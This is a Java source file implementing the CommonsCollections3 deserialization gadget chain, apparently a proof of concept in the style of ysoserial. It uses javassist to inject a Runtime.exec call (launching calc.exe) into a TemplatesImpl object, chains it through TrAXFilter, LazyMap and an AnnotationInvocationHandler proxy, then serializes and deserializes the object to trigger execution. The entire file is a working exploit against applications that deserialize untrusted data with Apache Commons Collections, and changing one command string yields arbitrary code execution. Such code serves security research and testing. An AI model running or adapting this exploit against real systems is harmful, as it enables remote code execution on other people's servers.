package com.tophant;

import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, CannotCompileException, NotFoundException, NoSuchFieldException {
        Object templatesInstance = createTemplatesImpl();

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesInstance})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);

        Constructor constructors = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        Permit.setAccessible(constructors);
        InvocationHandler invocationHandler = (InvocationHandler) constructors.newInstance(Override.class,lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(CommonsCollections3.class.getClassLoader(),new Class[]{Map.class},invocationHandler);
        InvocationHandler finalInvocationHandler = (InvocationHandler) constructors.newInstance(Override.class,proxyMap);

        FileOutputStream fileOutputStream = new FileOutputStream(new File("finalInvocationHandler.ser"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(finalInvocationHandler);

        FileInputStream fileInputStream = new FileInputStream(new File("finalInvocationHandler.ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();






    }

    public static Object createTemplatesImpl(){

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));

        try {
            CtClass ctClass = classPool.get(StubTransletPayload.class.getName());
            String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
            ctClass.makeClassInitializer().insertAfter(cmd);
            CtClass classSuper = classPool.get(AbstractTranslet.class.getName());
            ctClass.setSuperclass(classSuper);

            Class templateClass =TemplatesImpl.class;

            Field bytecodesField = templateClass.getDeclaredField("_bytecodes");
            Permit.setAccessible(bytecodesField);
            Field nameField = TemplatesImpl.class.getDeclaredField("_name");
            Permit.setAccessible(nameField);
            Field factoryField = TemplatesImpl.class.getDeclaredField("_tfactory");
            Permit.setAccessible(factoryField);




            byte[] tempBytes = new byte[1024];
            Class fooClass = Foo.class;
            Class parentClass = fooClass.getEnclosingClass();
            String fullName = parentClass.getName().replace(".","/")+"$"+fooClass.getSimpleName()+".class";

            InputStream tempFileInputStream = CommonsCollections3.class.getClassLoader().getResourceAsStream(fullName);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len =0;
            while((len = tempFileInputStream.read(tempBytes))!= -1) {
                out.write(tempBytes, 0, len);
            }

            TemplatesImpl templatesImpl = (TemplatesImpl) templateClass.newInstance();

            bytecodesField.set(templatesImpl,new byte[][]{ctClass.toBytecode(),out.toByteArray()});
            nameField.set(templatesImpl,"Pwner");
            factoryField.set(templatesImpl, new TransformerFactoryImpl());
            return templatesImpl;
        } catch (NotFoundException | CannotCompileException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();

        }

        return null;
    }

    public static class Foo implements Serializable{}
}

